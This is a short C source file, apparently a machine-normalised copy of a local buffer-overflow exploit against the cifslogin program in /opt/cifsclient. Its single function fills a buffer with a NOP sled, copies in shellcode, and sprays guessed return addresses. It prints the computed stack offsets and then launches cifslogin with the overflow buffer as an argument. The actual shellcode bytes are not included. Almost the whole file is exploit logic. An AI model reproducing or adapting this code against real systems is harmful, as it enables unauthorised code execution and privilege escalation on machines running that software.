#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int BUFF_LEN ; 
 long NOP ; 
 long T_LEN ; 
 int addr ; 
 char* buffer ; 
 int /*<<< orphan*/  FUNC0 (char*,char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC2 (char*,int,...) ; 
 char* shellcode ; 
 int FUNC3 (char*) ; 

FUNC4()
{
        int addr_off =800 ;

        int  n=BUFF_LEN/4,i=0;
        long * ap = (long *) &buffer[BUFF_LEN];
        char * sp = &buffer[BUFF_LEN-FUNC3(shellcode)];
        long * np = (long *) buffer;

        addr = ((long) &addr_off + T_LEN ) & 0xffffff40 +0x40 ;

        for(i=0;i<n;np[i++]=NOP);
        FUNC1(sp,shellcode,FUNC3(shellcode));
        for(i=0;i<(T_LEN-BUFF_LEN)/4;ap[i++]=addr+addr_off);

        FUNC2("SP=0x%x EXP_SP=0x%x OFF=0x%x (%i)\n",(long)&addr_off & 0xffffff40,addr,addr_off);
        FUNC2("Addr =0x%x NOP_LEN=%i\n",addr+addr_off,BUFF_LEN-FUNC3(shellcode));
        FUNC2("BUFFER_LEN=%i\n",FUNC3(buffer));

        FUNC0("/opt/cifsclient/bin/cifslogin","cifslogin","123",buffer,NULL);
}